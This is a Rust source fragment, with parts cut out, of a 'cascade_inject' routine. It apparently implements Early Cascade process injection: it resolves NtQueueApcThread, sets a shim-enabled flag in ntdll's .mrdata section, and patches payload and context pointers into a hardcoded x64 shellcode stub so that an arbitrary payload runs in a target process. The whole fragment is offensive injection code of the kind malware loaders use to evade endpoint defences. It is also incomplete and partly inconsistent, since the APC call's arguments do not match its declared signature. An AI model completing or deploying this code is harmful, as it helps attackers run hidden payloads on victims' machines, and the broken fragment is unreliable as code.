...
type NTSTATUS = i32;
// const SecData: *mut c_void = 0 as *mut c_void;
// const SecMrData: *mut c_void = 0 as *mut c_void;
...
// Defining NtCurrentThread
// const NtCurrentThread: HANDLE = -2isize as HANDLE;


// pub const CASCADE_STUB_X64: [u8; 66] = [
...
unsafe fn cascade_inject(process: *const i8, payload: &Buffer, context: Option<&Buffer>) -> NTSTATUS {
    ...
    if sec_data.is_null(){
        eprintln!("Section .mrdata is NuLL");
        return STATUS_UNSUCCESSFUL;
    }
    ...
    // NtQueueApcThread
    let queue_apc_str = CString::new("NtQueueApcThread").expect("CString creation failed");

    let raw_ptr = GetProcAddress(h_module, queue_apc_str.as_ptr());


    if raw_ptr.is_null(){
        eprintln!("[-] Failed to get NtQueueApcThread function pointer");
        return STATUS_UNSUCCESSFUL;
    }

    let nt_queue_apc_ptr: fn(
        thread_handle: HANDLE,
        apc_routine: *mut c_void,
        apc_argument1: *mut c_void, 
        apc_argument2: *mut c_void, 
        apc_argument3: *mut c_void, 
    ) -> NTSTATUS = std::mem::transmute(raw_ptr);



    println!("[+] NtQueueApcThread Func Pointer: {:?}", nt_queue_apc_ptr);

    // New g_shims_enable method ! 


    // let g_shims_enabled = 0x9999999999999999 as *mut u8;
    let mut g_shims_enabled = VirtualAlloc(
        null_mut(),
        1,  // Size in bytes (1 byte for bool)
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
    );


    if g_shims_enabled.is_null() {
        eprintln!("Failed to allocate memory for g_shims_enabled");
        return STATUS_UNSUCCESSFUL;
    }

    println!("[+] G_Shims_Enable: {:?}", g_shims_enabled);

    // Set the shim flag to `0` (false)
    *(g_shims_enabled as *mut u8) = 0;

    let g_payload = 0x8888888888888888 as *mut c_void;
    let g_context = 0x7777777777777777 as *mut c_void;

    let nt_status = nt_queue_apc_ptr(
        NtCurrentThread,
        g_payload,
        g_context,
        null_mut(),
    ...
    // println!("NTSTATUS of nt_queue_apc: {}", nt_status);

    if nt_status != 0 {
        eprintln!("[-] Failed to Queue APC: {:?}", nt_status);
        return STATUS_UNSUCCESSFUL;
    }
    ...
    g_shims_enabled = (sec_data as usize + 0x6cf0) as *mut u8 as *mut _;
    ...
    std::ptr::copy_nonoverlapping(
        &g_shims_enabled,
        CASCADE_STUB_X64.as_mut_ptr().add(25) as *mut *mut c_void,
        std::mem::size_of::<usize>(),
    );

    println!("[+] 2");

    // cacl the final location and copy to stub
